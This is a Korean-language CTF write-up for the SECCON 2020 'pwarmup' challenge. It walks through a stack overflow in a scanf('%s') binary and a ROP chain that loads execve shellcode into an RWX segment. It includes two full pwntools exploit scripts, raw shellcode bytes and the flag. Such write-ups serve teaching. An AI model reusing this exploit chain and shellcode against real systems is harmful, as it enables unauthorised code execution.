# pwarmup
### #rwx_segment #rop #pwn #pwntools

---

rop 상황에서 pwntools 의 사용을 극대화 시킬 수 있었던 문제. 

![sec](../../.images/pwarmup1.png)

우선 보호기법을 확인해보니 **RWX** 권한이 있는 영역이 있다고 한다.

**gdb** 로 확인해보면, `0x600000` 부분부터 `0x601000` 까지 **rwx** 권한이 있음을 알 수 있다. NX 도 안걸려있고, 저 부분이 쉘코드를 올릴 자리임을 알 수 있었다.

![vmmap](../../.images/pwarmup2.png)

바이너리의 코드를 확인해보자.

```C
/*
    main.c
*/
#include <unistd.h>
#include <stdio.h>

int main(void) {
  char buf[0x20];
  puts("Welcome to Pwn Warmup!");
  scanf("%s", buf);
  fclose(stdout);
  fclose(stderr);
}

__attribute__((constructor)) // main 보다 먼저실행
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  alarm(60);
}

```

간단한 코드이다. 가젯확인결과 바이너리에 쓸만한 가젯들도 있고, rop 를 시전할 수 있을 것 같았다. 하지만, **libc** 를 leak 할만한 함수가 보이지 않아서 **libc** 를 이용하는 것은 생각하지않았다.

여기서 사용한 전략은 이렇다.

> BOF -> ROP gadget 을 이용한 `scanf("%s",0x600000);` 실행 -> scanf 실행 뒤에 `execve("/bin/sh");` 쉘코드 입력 -> 0x600000 실행

![gdb](../../.images/pwarmup3.png)

위의 전략대로 익스플로잇 코드를 짜고 로컬에서 실행해보았는데, 로컬에서 안되는 바람에 한참 막혔다.

아무리 명령어를 쳐도 결과물이 보이지않는다. 나중에 `fclose(stdout)` 때문이라는 것을 알았고, `ls>&0` 로 살아있는 `stdin` 디스크립터에 출력을 리다이렉트 시켜서 플래그를 얻을 수 있었다.

![res](../../.images/pwarmup4.png)


```python
from pwn import *
context.arch='amd64'
elf=ELF("./chall")
scanf_plt=elf.plt['__isoc99_scanf']
scanf_arg0=0x40081B # "%s"
prdi=0x4007e3
prsi=0x4007e1
rwx=0x600000 # ~~ELF~~~ => starting point of binary
shellcode="\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
#s=process("./chall")
s=remote('pwn-neko.chal.seccon.jp',9001)
pause()
payload=b"a"*40
payload+=p64(prdi)
payload+=p64(scanf_arg0)
payload+=p64(prsi)
payload+=p64(rwx)
payload+=p64(0xdeadbeef)
payload+=p64(scanf_plt)
payload+=p64(rwx)
s.sendline(payload) # scanf in 0x600000 (rwx segment)
s.sendline(shellcode) # shellcode in 0x600000
s.interactive()
```



***\* 해당 [write up](https://github.com/mephi42/ctf/blob/master/2020.10.10-SECCON_2020_Online_CTF/pwarmup/pwnit.py) 을 참고하여 추가정리***

막판에 `stdout` 을 대처하는 방법이 위 링크에 있었다.

glibc 함수 중에는 인자로 오는 파일 디스크립터를 복붙해주는 `dup(arg)` 함수가 있는데, 이를 `stdin` 을 인자로 하여 syscall 로 호출하면 `stdout` 이 사용하는 1번 파일 디스크립터에 `stdin` 이 복사되어 소켓통신 중에 출력을 온전하게 볼 수 있다.
해당 풀이자의 익스 코드는 아래와 같다.

```python
#!/usr/bin/env python3
from pwn import *

BINARY = 'pwarmup/chall'


def connect():
    if args.LOCAL:
        return gdb.debug([BINARY], gdbscript='''
b *0x400707
c
''')
    else:
        return remote('pwn-neko.chal.seccon.jp', 9001)


def main():
    context.arch = 'amd64'
    percent_s = 0x40081B
    rwx = 0x600000
    rop = ROP([ELF(BINARY)])
    rop.call('__isoc99_scanf', [percent_s, rwx])
    rop.raw(rwx)
    rop = rop.chain()
    shellcode = asm(
        '''mov rax, 31
        inc rax
        xor rdi, rdi
        syscall
''' +
        shellcraft.amd64.linux.sh(),
        arch='amd64')
    #main_addr = 0x4006B7
    #puts_plt_addr = 0x400580
    #pop_rdi_ret_addr = 0x4007e3
    #puts_got_addr = 0x4006B7  # 0x600BB8
    whitespace = b'\x0a\x0b\x20'
    assert all(c not in rop for c in whitespace)
    assert all(c not in shellcode for c in whitespace)
    with connect() as tube:
        tube.sendline(flat({0x28: rop}))
        tube.sendline(shellcode)
        tube.interactive()  # SECCON{1t's_g3tt1ng_c0ld_1n_j4p4n_d0n't_f0rget_t0_w4rm-up}


if __name__ == '__main__':
    main()
```

.

.

.

**Contact:** a42873410@gmail.com



